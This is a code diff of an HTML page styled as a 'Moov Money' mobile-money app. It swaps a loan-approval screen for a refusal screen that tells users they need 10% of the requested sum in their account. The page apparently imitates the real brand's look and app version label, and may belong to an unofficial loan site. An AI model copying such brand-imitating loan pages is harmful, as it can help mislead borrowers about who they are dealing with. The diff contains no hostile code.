@@ -2,8 +2,8 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Moov Money - Félicitations</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Moov Money - Demande refusée</title>
 
     <style>
         /* ── reset & base ── */
@@ -29,7 +29,7 @@
             background: #fff;
             min-height: 100vh;
             position: relative;
-            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
         }
 
         /* ── top bar (same as other pages) ── */
@@ -85,17 +85,17 @@
             letter-spacing: 0.5px;
         }
 
-        /* ── checkmark ── */
-        .checkmark {
+        /* ── crossmark ── */
+        .crossmark {
             font-size: 72px;
             margin: 12px 0 16px;
             display: inline-block;
-            background: #e8f5e9;
+            background: #fce4e4;
             width: 100px;
             height: 100px;
             line-height: 100px;
             border-radius: 50%;
-            color: #4CAF50;
+            color: #d32f2f;
         }
 
         /* ── title & subtitle ── */
@@ -111,6 +111,11 @@
             color: #8b8b8b;
             margin-bottom: 28px;
             line-height: 1.6;
+        }
+
+        .sub strong {
+            color: #d32f2f;
+            font-weight: 600;
         }
 
         /* ── info box ── */
@@ -146,6 +151,37 @@
             font-size: 15px;
         }
 
+        .info-box .value.declined {
+            color: #d32f2f;
+        }
+
+        /* ── reason box ── */
+        .reason-box {
+            background: #fff3f3;
+            border-left: 4px solid #d32f2f;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin-bottom: 28px;
+            text-align: left;
+        }
+
+        .reason-box .reason-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #d32f2f;
+            margin-bottom: 4px;
+        }
+
+        .reason-box .reason-text {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .reason-box .reason-text strong {
+            color: #d32f2f;
+        }
+
         /* ── button ── */
         .btn-home {
             width: 100%;
@@ -158,7 +194,7 @@
             transition: all 0.2s ease;
             background: #9A0000;
             color: #fff;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
 
         .btn-home:hover {
@@ -183,63 +219,81 @@
 </head>
 <body>
 
-<div class="app-wrapper">
+    <div class="app-wrapper">
 
-    <!-- Top bar with back arrow (goes to home) -->
-    <div class="top-bar">
-        <button class="back-btn" onclick="window.location.href='index.html'">&#8592;</button>
-    </div>
-
-    <div class="container">
-
-        <!-- Logo -->
-        <div class="logo">
-            <div class="logo-circle">M</div>
-            <div class="moov-text">Moov Money</div>
+        <!-- Top bar with back arrow (goes to home) -->
+        <div class="top-bar">
+            <button class="back-btn" onclick="window.location.href='index.html'">&#8592;</button>
         </div>
 
-        <div class="checkmark">✅</div>
-        <h1>Prêt approuvé !</h1>
-        <div class="sub">Votre demande de prêt a été approuvée.<br/>Les fonds seront versés sur votre compte Moov Money.</div>
+        <div class="container">
 
-        <div class="info-box">
-            <div class="row">
-                <span class="label">Montant du prêt</span>
-                <span class="value" id="displayAmount">-</span>
+            <!-- Logo -->
+            <div class="logo">
+                <div class="logo-circle">M</div>
+                <div class="moov-text">Moov Money</div>
             </div>
-            <div class="row">
-                <span class="label">Durée</span>
-                <span class="value" id="displayTerm">-</span>
+
+            <div class="crossmark">&#10007;</div>
+            <h1>Prêt refusé</h1>
+            <div class="sub">
+                Nous ne pouvons pas approuver votre demande de prêt pour le moment.
             </div>
-            <div class="row">
-                <span class="label">Taux d'intérêt</span>
-                <span class="value">4,5 % TAEG</span>
+
+            <!-- Info box with loan details -->
+            <div class="info-box">
+                <div class="row">
+                    <span class="label">Montant du prêt</span>
+                    <span class="value" id="displayAmount">-</span>
+                </div>
+                <div class="row">
+                    <span class="label">Durée</span>
+                    <span class="value" id="displayTerm">-</span>
+                </div>
+                <div class="row">
+                    <span class="label">Statut</span>
+                    <span class="value declined">Refusé</span>
+                </div>
             </div>
+
+            <!-- Reason box -->
+            <div class="reason-box">
+                <div class="reason-title">&#9432; Motif du refus</div>
+                <div class="reason-text">
+                    Vous devez disposer d'au moins <strong>10 %</strong> du montant que vous souhaitez emprunter sur votre compte Moov Money pour bénéficier d'un prêt.
+                    <br /><br />
+                    <span style="font-size:13px; color:#888;">
+                        Astuce : Épargnez régulièrement pour atteindre ce seuil et améliorez vos chances d'obtenir un prêt.
+                    </span>
+                </div>
+            </div>
+
+            <button class="btn-home" onclick="window.location.href='index.html'">Retour à l'accueil</button>
+
+            <div class="footer">v 5.3.2 (1.0.0)</div>
         </div>
 
-        <button class="btn-home" onclick="window.location.href='index.html'">Retour à l'accueil</button>
-
-        <div class="footer">v 5.3.2 (1.0.0)</div>
     </div>
 
-</div>
+    <script>
+        (function() {
+            const amount = localStorage.getItem('loanAmount');
+            const term = localStorage.getItem('loanTerm');
 
-<script>
-    (function() {
-        const amount = localStorage.getItem('loanAmount');
-        const term = localStorage.getItem('loanTerm');
-        if (amount) {
-            document.getElementById('displayAmount').textContent = Number(amount).toLocaleString('fr-FR') + ' FCFA';
-        }
-        if (term) {
-            document.getElementById('displayTerm').textContent = term + ' mois';
-        }
-        // Optional: clear sensitive data after display
-        // localStorage.removeItem('phone');
-        // localStorage.removeItem('loanAmount');
-        // localStorage.removeItem('loanTerm');
-    })();
-</script>
+            if (amount) {
+                document.getElementById('displayAmount').textContent =
+                    Number(amount).toLocaleString('fr-FR') + ' FCFA';
+            }
+            if (term) {
+                document.getElementById('displayTerm').textContent = term + ' mois';
+            }
+
+            // Optionally clear sensitive data after display
+            // localStorage.removeItem('phone');
+            // localStorage.removeItem('loanAmount');
+            // localStorage.removeItem('loanTerm');
+        })();
+    </script>
 
 </body>
 </html>
